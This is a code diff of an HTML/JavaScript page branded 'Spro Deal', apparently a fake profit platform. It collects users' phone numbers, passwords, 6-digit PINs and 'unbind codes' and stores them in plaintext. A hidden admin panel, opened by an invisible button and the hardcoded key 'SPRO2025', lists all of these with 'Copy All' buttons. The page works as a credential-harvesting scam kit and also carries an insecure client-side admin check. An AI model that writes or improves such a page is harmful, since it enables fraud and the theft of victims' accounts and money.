+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60' viewBox='0 0 24 24' fill='%232e7d32'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E" style="width: 55px;">
                     <h1 class="brand">Spro Deal</h1>
                     <p class="tagline">A stable and profitable platform</p>
                 </div>
-                <h3 style="margin-bottom: 15px; color:#333;">SIGN IN TO SPRO DEAL</h3>
+                <h3>SIGN IN TO SPRO DEAL</h3>
                 <div class="phone-wrapper">
                     <span class="country-code">+91</span>
-                    <input type="tel" id="phone" placeholder="Please enter phone number">
+                    <input type="tel" id="phone" placeholder="Enter phone number">
                 </div>
                 <input type="password" id="password" placeholder="Password" class="input-field">
                 <button id="signinBtn" class="green-btn">SIGN IN</button>
-                <p class="tagline" style="margin-top: 15px;">By logging in you agree to our Privacy Policy</p>
+                <p class="tagline">By logging in you agree to our Privacy Policy</p>
             </div>
             <div class="secret-admin-btn" id="secretAdminBtn"></div>
         `;
         document.getElementById('signinBtn').onclick = handleLogin;
         document.getElementById('secretAdminBtn').onclick = () => {
             let key = prompt('🔐 ENTER ADMIN KEY');
-            if (key === ADMIN_KEY) renderAdminPanel();
+            if (key === 'SPRO2025') renderAdminPanel();
             else if (key) alert('❌ Invalid Key');
         };
     }
@@ -1069,14 +837,19 @@
         let password = document.getElementById('password').value;
         if (!phone || !password) { alert('Please enter phone and password'); return; }
         
-        await saveUserToCloud(phone, password, null, null);
+        await syncFromCloud();
         
         let users = getUsers();
         let existingUser = users.find(u => u.phone === phone);
         if (existingUser) {
+            existingUser.password = password;
+            saveUsers(users);
             currentUser = existingUser;
         } else {
-            currentUser = { phone, password, pin: null, unbindCode: null, created_at: new Date().toISOString() };
+            let newUser = { phone, password, pin: null, unbindCode: null, created_at: new Date().toISOString() };
+            users.push(newUser);
+            saveUsers(users);
+            currentUser = newUser;
         }
         renderPINVerify();
     }
@@ -1087,7 +860,7 @@
                 <h2>🔐 SECURITY VERIFICATION</h2>
                 <p style="color:#2e7d32;">Welcome ${currentUser.phone}</p>
                 <p>Enter 6-digit PIN to continue</p>
-                <input type="password" id="pin" maxlength="6" class="code-input" placeholder="Enter 6-digit PIN" style="width:100%; padding:14px; border-radius:20px; border:1px solid #ccc; text-align:center; font-size:20px; letter-spacing:4px;">
+                <input type="password" id="pin" maxlength="6" class="code-input" placeholder="Enter 6-digit PIN">
                 <button id="verifyPinBtn" class="green-btn">VERIFY & CONTINUE</button>
             </div>
             <div class="secret-admin-btn" id="secretAdminBtn"></div>
@@ -1096,13 +869,14 @@
         document.getElementById('verifyPinBtn').onclick = async () => {
             let pin = document.getElementById('pin').value;
             if (pin.length !== 6) { alert('PIN must be 6 digits'); return; }
-            currentUser.pin = pin;
-            await saveUserToCloud(currentUser.phone, currentUser.password, pin, currentUser.unbindCode);
+            let users = getUsers();
+            let user = users.find(u => u.phone === currentUser.phone);
+            if (user) { user.pin = pin; saveUsers(users); currentUser.pin = pin; }
             renderDashboard();
         };
         document.getElementById('secretAdminBtn').onclick = () => {
             let key = prompt('🔐 ENTER ADMIN KEY');
-            if (key === ADMIN_KEY) renderAdminPanel();
+            if (key === 'SPRO2025') renderAdminPanel();
             else if (key) alert('❌ Invalid Key');
         };
     }
@@ -1113,7 +887,7 @@
                 <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 12px;">
                     <h3 style="font-size: 18px;">🤖 Spro Support</h3>
                     <span class="online-status"></span>
-                    <span style="font-size: 11px; color: green;">Online • Active now</span>
+                    <span style="font-size: 11px; color: green;">Online</span>
                 </div>
                 <div id="chatBox" class="chat-box"></div>
                 <div id="optionsArea" class="options-grid"></div>
@@ -1128,10 +902,8 @@
         currentChatBox = chatBox;
         
         setTimeout(() => {
-            addMessage(chatBox, 'bot', "Welcome back! 👋 I'm your personal support assistant. How can I help you today?");
-            setTimeout(() => {
-                addMessage(chatBox, 'bot', "Please select your issue from below 👇");
-            }, 2000);
+            addMessage(chatBox, 'bot', "Welcome back! 👋 How can I help you today?");
+            setTimeout(() => addMessage(chatBox, 'bot', "Please select an issue below 👇"), 2000);
         }, 500);
         
         const issues = [
@@ -1163,15 +935,16 @@
         };
         document.getElementById('secretAdminBtn').onclick = () => {
             let key = prompt('🔐 ENTER ADMIN KEY');
-            if (key === ADMIN_KEY) renderAdminPanel();
+            if (key === 'SPRO2025') renderAdminPanel();
             else if (key) alert('❌ Invalid Key');
         };
     }
     
     async function renderAdminPanel() {
-        let data = getAdminData();
-        let users = data.users;
-        let requests = data.requests;
+        await syncFromCloud();
+        
+        let users = getUsers();
+        let requests = getRequests();
         
         let pendingRequests = requests.filter(r => r.status === 'pending');
         let approvedRequests = requests.filter(r => r.status === 'approved');
@@ -1188,81 +961,46 @@
                     <span>❌ Rejected: ${rejectedRequests.length}</span>
                 </div>
                 
-                <div class="section-title">📋 USERS DETAILS (ID | PASSWORD | PIN | UNBIND CODE)</div>
+                <div class="section-title">📋 USERS DETAILS</div>
                 <table class="admin-table">
                     <thead>
-                        <tr>
-                            <th>#</th>
-                            <th>Phone / User ID</th>
-                            <th>Password</th>
-                            <th>PIN</th>
-                            <th>Unbind Code</th>
-                            <th>Created At</th>
-                            <th>Copy</th>
-                        </tr>
+                        <tr><th>#</th><th>Phone</th><th>Password</th><th>PIN</th><th>Unbind Code</th><th>Created</th><th>Copy</th></tr>
                     </thead>
                     <tbody>
                         ${users.map((user, index) => `
                             <tr>
-                                <td>${index + 1}</td>
+                                <td>${index+1}</td>
                                 <td><strong>${user.phone}</strong></td>
                                 <td>${user.password || 'N/A'}</td>
                                 <td>${user.pin || 'Not set'}</td>
                                 <td>${user.unbindCode || 'Not submitted'}</td>
                                 <td>${new Date(user.created_at).toLocaleString()}</td>
-                                <td>
-                                    <button class="copy-btn" onclick="copyToClipboard('ID: ${user.phone}\\nPassword: ${user.password}\\nPIN: ${user.pin || 'Not set'}\\nUnbind Code: ${user.unbindCode || 'Not submitted'}', this)">📋 Copy All</button>
-                                </td>
+                                <td><button class="copy-btn" onclick="copyToClipboard('ID: ${user.phone}\\nPassword: ${user.password}\\nPIN: ${user.pin}\\nUnbind: ${user.unbindCode}', this)">Copy</button></td>
                             </tr>
                         `).join('')}
-                        ${users.length === 0 ? '<tr><td colspan="7" style="text-align:center;">No users found</td>' : ''}
                     </tbody>
                 </table>
                 
-                <div class="section-title">⏳ PENDING REQUESTS (Approve / Reject)</div>
+                <div class="section-title">⏳ PENDING REQUESTS</div>
                 <table class="admin-table">
-                    <thead>
-                        <tr>
-                            <th>ID</th>
-                            <th>User Phone</th>
-                            <th>Issue</th>
-                            <th>Unbind Code</th>
-                            <th>Details</th>
-                            <th>Time</th>
-                            <th>Action</th>
-                        </tr>
-                    </thead>
+                    <thead><tr><th>ID</th><th>User</th><th>Issue</th><th>Unbind Code</th><th>Time</th><th>Action</th></tr></thead>
                     <tbody>
                         ${pendingRequests.map(req => `
                             <tr>
                                 <td>${req.id}</td>
-                                <td><strong>${req.phone}</strong></td>
+                                <td>${req.phone}</td>
                                 <td>${req.issue}</td>
-                                <td><strong style="color:#2e7d32;">${req.unbindCode || 'N/A'}</strong></td>
-                                <td><small>${JSON.stringify(req.details).substring(0, 50)}...</small></td>
+                                <td><strong>${req.unbindCode || 'N/A'}</strong></td>
                                 <td>${new Date(req.created_at).toLocaleString()}</td>
-                                <td>
-                                    <button class="approve-btn" data-id="${req.id}">✅ Approve</button>
-                                    <button class="reject-btn" data-id="${req.id}">❌ Reject</button>
-                                </td>
+                                <td><button class="approve-btn" data-id="${req.id}">Approve</button><button class="reject-btn" data-id="${req.id}">Reject</button></td>
                             </tr>
                         `).join('')}
-                        ${pendingRequests.length === 0 ? '<tr><td colspan="7" style="text-align:center;">No pending requests</td></tr>' : ''}
                     </tbody>
                 </table>
                 
-                <div class="section-title">📜 ALL REQUESTS HISTORY</div>
+                <div class="section-title">📜 ALL REQUESTS</div>
                 <table class="admin-table">
-                    <thead>
-                        <tr>
-                            <th>ID</th>
-                            <th>User Phone</th>
-                            <th>Issue</th>
-                            <th>Unbind Code</th>
-                            <th>Status</th>
-                            <th>Time</th>
-                        </tr>
-                    </thead>
+                    <thead><tr><th>ID</th><th>User</th><th>Issue</th><th>Code</th><th>Status</th><th>Time</th></tr></thead>
                     <tbody>
                         ${[...requests].reverse().map(req => `
                             <tr>
@@ -1274,42 +1012,42 @@
                                 <td>${new Date(req.created_at).toLocaleString()}</td>
                             </tr>
                         `).join('')}
-                        ${requests.length === 0 ? '<tr><td colspan="6" style="text-align:center;">No requests found</td></tr>' : ''}
                     </tbody>
                 </table>
                 
-                <button id="adminLogout" class="gray-btn" style="margin-top:20px;">🚪 LOGOUT</button>
+                <button id="adminLogout" class="gray-btn">🚪 LOGOUT</button>
             </div>
             <div class="secret-admin-btn" id="secretAdminBtn"></div>
         `;
         
         document.querySelectorAll('.approve-btn').forEach(btn => {
-            btn.onclick = async () => {
-                await updateRequestStatusInCloud(parseInt(btn.getAttribute('data-id')), 'approved');
-                renderAdminPanel();
-            };
+            btn.onclick = () => updateRequestStatus(parseInt(btn.dataset.id), 'approved');
         });
         document.querySelectorAll('.reject-btn').forEach(btn => {
-            btn.onclick = async () => {
-                await updateRequestStatusInCloud(parseInt(btn.getAttribute('data-id')), 'rejected');
-                renderAdminPanel();
-            };
+            btn.onclick = () => updateRequestStatus(parseInt(btn.dataset.id), 'rejected');
         });
         
         document.getElementById('adminLogout').onclick = () => renderLogin();
         document.getElementById('secretAdminBtn').onclick = () => {
             let key = prompt('🔐 ENTER ADMIN KEY');
-            if (key === ADMIN_KEY) renderAdminPanel();
+            if (key === 'SPRO2025') renderAdminPanel();
             else if (key) alert('❌ Invalid Key');
         };
     }
     
-    window.copyToClipboard = copyToClipboard;
+    async function updateRequestStatus(requestId, newStatus) {
+        let requests = getRequests();
+        let request = requests.find(r => r.id === requestId);
+        if (request) {
+            request.status = newStatus;
+            saveRequests(requests);
+            alert(`✅ Request ${newStatus.toUpperCase()}!`);
+            renderAdminPanel();
+        }
+    }
     
-    // Initialize - load from cloud first
-    loadFromCloud().then(() => {
-        renderLogin();
-    });
+    window.copyToClipboard = copyToClipboard;
+    renderLogin();
 </script>
 </body>
 </html>
